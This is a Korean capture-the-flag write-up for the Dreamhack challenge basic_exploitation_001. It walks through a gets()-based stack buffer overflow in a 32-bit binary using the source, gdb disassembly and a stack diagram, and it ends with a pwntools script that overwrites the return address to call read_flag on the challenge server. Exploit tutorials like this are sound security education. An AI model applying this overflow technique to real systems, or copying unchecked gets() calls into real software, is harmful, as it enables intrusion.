# 목차
1. 문제 설명

    1.1. Description

    1.2. Environment

2. 문제 파일 분석

    2.1. 코드 분석

    2.2. 실행 파일 분석

3. 문제 풀이 코드

## 1. 문제 설명

### 1.1. Description

이 문제는 서버에서 작동하고 있는 서비스(basic_exploitation_001)의 바이너리와 소스 코드가 주어집니다.

프로그램의 취약점을 찾고 익스플로잇해 "flag" 파일을 읽으세요.

"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.

플래그의 형식은 DH{...} 입니다.

### 1.2. Environment

Ubuntu 16.04

Arch:     i386-32-little

RELRO:    No RELRO

Stack:    No canary found

NX:       NX enabled

PIE:      No PIE (0x8048000)

## 2. 문제 파일 분석

### 2.1. 코드 분석

`cat basic_exploitation_001.c`를 통해 코드를 확인
```
// basic_exploitation_001.c //

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


void read_flag() {
    system("cat /flag");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    gets(buf);

    return 0;
}
```
- 주요 기능
    - `main`함수가 실행
    - 스택 메모리에 `0x80(128)byte`의 공간을 부여
    - `gets(buf)`를 통해 입력을 받음

    - `read_flag`함수가 실행되면 `/flag`파일의 내용을 출력

- 주의
    - `gets`함수가 버퍼 크기에 대한 검증이 실행하지 않음
    - `gets`함수의 버퍼를 다 채울 경우 `null`이 들어갈 수 없어 오류 발생

위의 과정을 통해 **stack-bof**를 발생시킬 수 있음을 확인

즉, ASLR 보호 기법이 없는 경우 `gets`함수의 복귀 주소가 저장되어있는 `ret`에 `read_flag`함수의 주소를 넣어 **ret overwrite**이 발생 가능

### 2.2. 실행 파일 분석

`gdb ./basic_exploitation_001`를 통해 GNU 디버거를 실행

`disass main`를 통해 `main`함수의 어셈블리 확인
```
Dump of assembler code for function main:
   0x080485cc <+0>:     push   ebp
   0x080485cd <+1>:     mov    ebp,esp
   0x080485cf <+3>:     add    esp,0xffffff80
   0x080485d2 <+6>:     call   0x8048572 <initialize>
   0x080485d7 <+11>:    lea    eax,[ebp-0x80]
   0x080485da <+14>:    push   eax
   0x080485db <+15>:    call   0x80483d0 <gets@plt>
=> 0x080485e0 <+20>:    add    esp,0x4
   0x080485e3 <+23>:    mov    eax,0x0
   0x080485e8 <+28>:    leave
   0x080485e9 <+29>:    ret
```
`0x080485d7 <+11>:    lea    eax,[ebp-0x80]`: gets 함수의 시작주소를 저장

`0x080485db <+15>:    call   0x80483d0 <gets@plt>`: `0x80483d0` 주소에 저장된 `gets`함수를 실행

스택에 쌓인 모습
```
높은 메모리 주소
+-----------------+ <-- esp (Stack Pointer: 스택 포인터)
|       ...       |
+-----------------+
|       ret       | <-- gets 함수 호출 후 반환될 주소
|  (Return addr)  |
+-----------------+
|       sfp       | <-- ebp (베이스 포인터)
|   (Saved EBP)   | <-- 이전 ebp의 값을 가짐
+-----------------+
|    (128 byte)   |
|       buf       |
+-----------------+ <-- buf 배열의 시작 주소 (ebp - 0x80)
낮은 메모리 주소
```
`"x/i read_flag" or "disass read_flag"`등을 입력

`0x80485b9 <read_flag>:       push   ebp`

`ret`에 들어갈 `read_flag`함수의 주소 확인

## 3. 문제 풀이 코드

```
from pwn import *

payload = b'\x90'*128 + b'\x90'*4 + b'\xb9\x85\x04\x08' #buf + sfp + read_flag()

r = remote('host3.dreamhack.games', 12515)

r.send(payload)

r.interactive()
```
`\x90*128`: 버퍼에 아무 문자로 다 채움

`\x90*4`: sfp에 아무 문자로 다 채움

*32bit 환경에서는 sfp가 4byte의 크기*

*64bit 환경에서는 sfp가 8byte의 크기*

`\xb9\x85\x04\x08`: `ret`에 들어갈 `read_flag`함수의 주소를 리틀엔디안 방식으로 입력